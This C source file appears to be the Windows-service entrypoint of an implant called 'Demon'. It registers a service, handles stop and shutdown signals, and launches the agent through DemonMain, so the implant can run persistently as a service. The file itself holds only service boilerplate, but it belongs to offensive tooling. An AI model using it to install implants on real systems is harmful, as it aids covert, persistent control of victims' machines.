#include <Demon.h>

/* Service handle and status variable */
SERVICE_STATUS_HANDLE StatusHandle = { 0 };
SERVICE_STATUS        SvcStatus    = {
    .dwServiceType      = SERVICE_WIN32,
    .dwCurrentState     = SERVICE_START_PENDING,
    .dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN,
};

/* Service Functions */
VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR* Argv );
VOID WINAPI SrvCtrlHandler( DWORD CtrlCode );

/* Our entrypoint for Windows service executable. */
INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    PRINTF( "WinMain (Service Main): hInstance:[%p]\n", hInstance )

    SERVICE_TABLE_ENTRY DispatchTable[ ] = {
        { SERVICE_NAME, SvcMain },
        { NULL, NULL }
    };

    StartServiceCtrlDispatcherA( DispatchTable );

    return 0;
}

/* Service executable entrypoint */
VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR* Argv )
{
    StatusHandle = RegisterServiceCtrlHandlerA( SERVICE_NAME, SrvCtrlHandler );
    if ( ! StatusHandle )
        return;

    /* start our agent */
    DemonMain( NULL, NULL );
}

VOID WINAPI SrvCtrlHandler( DWORD CtrlCode )
{
    /* if we get any kind of exit code then it's time to say goodbye */
    if ( ( CtrlCode == SERVICE_CONTROL_STOP ) || ( CtrlCode == SERVICE_CONTROL_SHUTDOWN ) )
    {
        SvcStatus.dwWin32ExitCode = 0;
        SvcStatus.dwCurrentState  = SERVICE_STOPPED;

        SetServiceStatus( StatusHandle, &SvcStatus );
    }
}